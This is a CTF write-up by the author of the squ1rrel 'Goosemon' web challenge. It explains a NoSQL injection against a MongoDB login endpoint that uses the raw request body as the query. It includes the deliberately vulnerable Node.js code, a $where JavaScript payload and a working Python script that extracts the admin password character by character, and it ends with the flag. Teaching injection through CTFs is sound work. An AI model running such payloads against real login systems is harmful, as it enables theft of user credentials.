---
layout: post
current: post
cover:  assets/squ1rrel/kyleburgess2025/goosemon/cover.webp
navigation: True
title: "Goosemon"
date: 2024-05-06 11:59:00
tags: [squ1rrel, web]
class: post-template
subclass: 'post'
author: kyleburgess2025
---

I'd rather die than use a password manager. In other news, can anyone help me remember the login info for my account? *The flag for this challenge is the account password.*

This was the first challenge I've ever written, so be nice to her, okay? I've seen countless SQL injection challenges, but as a corporate shill who is interning at MongoDB this summer, I wanted to try out NoSQL injection. This challenge is inspired by [this writeup](https://kevin-denotariis.medium.com/writeup-wild-goose-hunt-cyber-apocalypse-2021-ctf-hackthebox-38dde9c50178) by Kevin De Notariis about a Cyber Apocalypse 2021 challenge with a similar premise. My challenge ended up getting 54 solves, the 2nd most solves in the web category.

This writeup will include the intended solution; I saw a bunch of other solutions in writeups that use a similar premise, but different queries. I'll link those as I find them.

# The Problem

We are given a simple webpage for Goosemon, the totally-copyright-friendly monster collecting game themed on geese. The only option is to sign in. When we get to the sign in page, we can see that we need a username and a password. The project description let us know that the password is the flag. That's pretty much all you can get from the website on first glance.

![image of login website](/assets/squ1rrel/kyleburgess2025/goosemon/signin.webp)

Next, let's take a look at the source code. We can see that the flag is loaded into the database in the startup script and is associated with the `admin` username. 

```js
const { MongoClient } = require('mongodb');

// add the flag to the database
const url = process.env.ME_CONFIG_MONGODB_URL;
const client = new MongoClient(url);
const dbName = 'goosemon';
const flag = process.env.FLAG;
const userCollection = 'users';
const flagDoc = { username: "admin", password: flag };

(async () => {
    await client.connect();
    const db = client.db(dbName);
    const collection = db.collection(userCollection);
    await collection.insertOne(flagDoc);
    console.log('Flag added to database');
    await client.close();
}
)();
```

The .html file shows nothing interesting, just that we are calling the `/login` endpoint when we log in. However, the `/login` endpoint seems to be interesting, for a variety of reasons.

```js
const filter = (input) => {
    if (typeof input === 'string') {
        return input.toLowerCase().includes('regex');
    }
  
    if (typeof input === 'object') {
        return JSON.stringify(input).toLowerCase().includes('regex');
    }
}

app.post("/login", jsonParser, async (req, res) => {
  try {
    if (!req.body) {
      res.status(400).send("Request body is missing");
      return;
    }
    if (filter(req.body)) {
        res.status(400).send("Nuh uh uh, no regex allowed!");
        return;
    }

    const db = client.db(dbName);
    const collection = db.collection("users");

    const data = collection.find(req.body);
    const result = await data.toArray();
    if (result.length > 0) {
      res.status(200).send("Login successful!");
    } else {
      res.status(400).send("Login failed!");
    }
  } catch (error) {
    console.log(error);
    res.status(500).send("Internal server error");
  }
});
```

The first thing that catches my eye is the `filter` function. We cannot use the word "regex" anywhere in our query, ruling out the NoSQL injection mentioned in De Notariis's writeup. Also, there is virtually no query verification being done here. Our input is being used as the query itself - it doesn't make sure it consists of `username` and `password` fields. This is also important for my solve.

One last thing to note...

```yml
mongo:
image: mongo:5.0.26
restart: always
environment:
    MONGO_INITDB_ROOT_USERNAME: root
    MONGO_INITDB_ROOT_PASSWORD: password
```

This application does not use the most recent version of MongoDB; instead, it uses version 5. This is not completely necessary for solving the challenge, but it does make it easier for reasons we will see later.

# Putting It Together
Ok, let's get query building. My approach is to start with what we know the password starts with: `squ1rrel{`. Then, we go one by one through all of the allowable characters, concatenating them with our current password. We will see if the new password (with the added character) is a substring of the full password; if so, repeat to find the next character until we hit the final `}`. If not, we move on to the next character. 

There's a few methods we could use for finding if a string is a substring of an entry in the database. The method I used was the `$where` function, which allows you to use JavaScript in your queries. Something to note about this `$where` function: MongoDB version 6.0 updated the internal JavaScript engine to disallow a bunch of string and array methods, including `.contains`, `.substr`, `.includes`, and others. See the full list [here](https://www.mongodb.com/docs/manual/release-notes/6.0-compatibility/#std-label-6.0-js-engine-change). I decided to use `.contains` and created the following query:

```py
payload = {
    "username": "admin",
    "$where" : f"this.password.includes(\"{curr_pw}\")"
    }
```

My solve script, therefore, looked like this:

```py
import requests

url = "http://34.132.166.199:5249/login"

full_pw = "squ1rrel{"

def check_chars(password):
    for char in range(0x21, 0x7F): 
        curr_pw = password + chr(char)

        payload = {
            "username": "admin",
            "$where": f"this.password.includes(\"{curr_pw}\")"
            }

        response = requests.post(url, json=payload)

        if 'Login successful' in response.text:
            print(curr_pw)
            return curr_pw

while full_pw[-1] != "}":
    full_pw = check_chars(full_pw)

print(full_pw)
```

This runs great, until...

![image of Python logs showing the script failing](/assets/squ1rrel/kyleburgess2025/goosemon/logs.webp)

Oh no, "regex" is in the flag! Thankfully, since my method looks for a substring, I can restart my solve script with `egex` as the original `full_pw`. A few potential solves, including those that use the `$lt` and `$gt` operator, stopped working completely at this point. I added `regex` to the flag mainly to mess with people and make some queries not work. This was cruel. Sorry 🤭

Flag: `squ1rrel{7h0ugh7_y0u_c0u1d_regex_y0ur_way_0u7_0f_7h1s_ay3?}`